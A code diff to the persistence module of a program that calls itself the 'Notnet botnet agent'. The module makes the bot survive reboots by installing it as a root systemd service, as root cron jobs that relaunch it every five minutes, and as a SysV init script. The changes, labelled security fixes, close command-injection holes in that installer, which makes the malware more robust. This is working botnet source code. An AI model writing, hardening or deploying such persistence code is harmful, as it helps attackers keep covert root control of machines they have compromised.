@@ -10,6 +10,7 @@
 #include <unistd.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include <errno.h>
 
 /* ── Init System Detection ────────────────────────────────── */
 int detect_init_system(void) {
@@ -49,12 +50,35 @@ int get_persist_path(char *buf, int len) {
     return 0;
 }
 
+/* SECURITY FIX (#41/#42/#43): Validate a binary path before it is
+ * interpolated into system() shell commands or init scripts.
+ * Reject anything outside [a-zA-Z0-9_./-] — spaces, quotes, backticks,
+ * $, ;, |, &, >, <, newlines all break out of the quoting/shell context
+ * (CWE-78). Returns 0 if safe, -1 if rejected. */
+static int validate_bin_path(const char *bin_path) {
+    if (!bin_path || bin_path[0] == '\0') return -1;
+    for (const char *p = bin_path; *p; p++) {
+        char c = *p;
+        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+              (c >= '0' && c <= '9') || c == '_' || c == '.' ||
+              c == '/' || c == '-')) {
+            log_error("Persistence: bin_path rejected (unsafe char '%c')", c);
+            return -1;
+        }
+    }
+    return 0;
+}
+
 /* ── systemd Service ─────────────────────────────────────── */
 int install_systemd(const char *bin_path) {
+    if (validate_bin_path(bin_path) != 0) return -1;
+
     char unit_path[256];
     snprintf(unit_path, sizeof(unit_path), "/etc/systemd/system/notnet.service");
     
     char content[512];
+    /* SECURITY FIX (#43): Quote ExecStart so even a path containing
+     * spaces cannot be mis-parsed as multiple arguments. */
     snprintf(content, sizeof(content),
         "[Unit]\n"
         "Description=Notnet Bot\n"
@@ -62,7 +86,7 @@ int install_systemd(const char *bin_path) {
         "\n"
         "[Service]\n"
         "Type=simple\n"
-        "ExecStart=%s\n"
+        "ExecStart=\"%s\"\n"
         "Restart=always\n"
         "RestartSec=30\n"
         "User=root\n"
@@ -91,59 +115,91 @@ int install_systemd(const char *bin_path) {
 
 /* ── cron Job ──────────────────────────────────────────────── */
 int install_cron(const char *bin_path) {
+    if (validate_bin_path(bin_path) != 0) return -1;
+
     char cron_line[256];
     snprintf(cron_line, sizeof(cron_line),
         "@reboot %s\n"
         "*/5 * * * * %s\n",
         bin_path, bin_path);
-    
-    /* Add to root crontab if writable */
-    FILE *f = popen("crontab -l 2>/dev/null", "r");
+
+    /* SECURITY FIX (#42): Do NOT pipe the cron line through a shell
+     * echo. The old code ran `(crontab -l; echo '%s') | crontab -` —
+     * a single quote in bin_path (or in the existing crontab) broke
+     * out of the quoting and executed arbitrary commands (CWE-78).
+     * Build the new crontab in a temp file and feed it to crontab
+     * directly; no shell interpolation of the cron line at all. */
+
+    /* Read existing crontab */
     char existing[4096];
     existing[0] = '\0';
+    FILE *f = popen("crontab -l 2>/dev/null", "r");
     if (f) {
         fread(existing, 1, sizeof(existing) - 1, f);
         existing[sizeof(existing) - 1] = '\0';
         pclose(f);
     }
-    
+
     /* Check if already installed */
     if (strstr(existing, bin_path)) {
         log_info("cron: already installed");
         return 0;
     }
-    
-    /* Install */
+
+    /* Write combined crontab to a temp file */
+    char tmp_path[] = "/tmp/notnet.cron.XXXXXX";
+    int fd = mkstemp(tmp_path);
+    if (fd < 0) {
+        log_error("cron: mkstemp failed: %s", strerror(errno));
+        return -1;
+    }
+    FILE *tf = fdopen(fd, "w");
+    if (!tf) {
+        close(fd);
+        unlink(tmp_path);
+        log_error("cron: fdopen failed: %s", strerror(errno));
+        return -1;
+    }
+    if (existing[0]) fprintf(tf, "%s\n", existing);
+    fprintf(tf, "%s", cron_line);
+    fclose(tf);
+
+    /* Install via crontab <file> — no shell, no interpolation */
     char cmd[512];
-    snprintf(cmd, sizeof(cmd),
-        "(crontab -l 2>/dev/null; echo '%s') | crontab -",
-        cron_line);
-    
+    snprintf(cmd, sizeof(cmd), "crontab %s", tmp_path);
     int ret = system(cmd);
+    unlink(tmp_path);
+
     if (ret == 0) {
         log_info("cron: job installed");
+    } else {
+        log_warn("cron: install failed (ret %d)", ret);
     }
-    
+
     return ret;
 }
 
 /* ── SysV Init Script ────────────────────────────────────── */
 int install_sysv(const char *bin_path) {
+    if (validate_bin_path(bin_path) != 0) return -1;
+
     char script_path[256];
     snprintf(script_path, sizeof(script_path), "/etc/init.d/notnet");
     
     char content[512];
+    /* SECURITY FIX (#43): Quote BIN="..." so a path with spaces cannot
+     * be split into multiple words by the init script's shell. */
     snprintf(content, sizeof(content),
         "#!/bin/sh\n"
         "# Notnet Bot\n"
         "# Description: Notnet botnet agent\n"
         "# chkconfig: 2345 99 01\n"
         "\n"
-        "BIN=%s\n"
+        "BIN=\"%s\"\n"
         "\n"
         "case \"$1\" in\n"
         "  start)\n"
-        "    $BIN &\n"
+        "    \"$BIN\" &\n"
         "    ;;\n"
         "  stop)\n"
         "    killall notnet 2>/dev/null\n"
@@ -198,6 +254,13 @@ int persist_install(notnet_bot_t *bot) {
     
     char bin_path[256];
     get_persist_path(bin_path, sizeof(bin_path));
+
+    /* SECURITY FIX (#41/#42/#43): Validate the final bin_path before any
+     * installer interpolates it into a shell command or init script. */
+    if (validate_bin_path(bin_path) != 0) {
+        log_error("Persistence: refusing to install with unsafe bin_path %s", bin_path);
+        return -1;
+    }
     
     /* Install to the detected init system(s) */
     if (detected & PERSIST_SYSTEMD) {
